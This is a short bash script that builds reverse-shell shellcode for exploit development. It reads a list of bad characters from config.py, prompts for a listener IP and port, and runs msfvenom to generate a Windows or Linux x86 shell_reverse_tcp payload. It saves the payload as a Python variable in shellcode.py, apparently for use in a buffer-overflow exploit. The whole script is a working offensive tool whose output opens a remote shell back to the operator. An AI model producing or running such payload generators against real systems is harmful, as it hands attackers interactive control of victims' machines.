#!/bin/bash

cat ./config.py | grep BADCHARS | cut -d "[" -f2 | cut -d "]" -f1 > badchars.txt
sed -i 's/0x/\\x/g' badchars.txt
sed -i 's/,//g' badchars.txt
sed -i 's/\ //g' badchars.txt
bad=$(cat ./badchars.txt)

echo ""
echo -n " LHOST : "; read ip
echo -n " LPORT : "; read port
echo ""
echo " PLATFORM"
echo " (l = linux/x86/shell_reverse_tcp; w = windows/shell_reverse_tcp)"
echo -n " : "; read p

case $p in

	w)
		echo "# msfvenom -p windows/shell_reverse_tcp -b "\"$bad\"" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread" > shellcode.py
		msfvenom -p windows/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread >> shellcode.py
		;;
	l)
		echo "# msfvenom -p linux/x86/shell_reverse_tcp -b "\"$bad\"" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread" > shellcode.py
		msfvenom -p linux/x86/shell_reverse_tcp -b "'$bad'" -f python --var-name shellcode LHOST=$ip LPORT=$port EXITFUNC=thread >> shellcode.py
		;;
	*)
		echo "Illegal choice"
		exit 1
esac

sed -i 's/=  b\"/=  \"/g' shellcode.py
sed -i 's/= b\"/= \"/g' shellcode.py
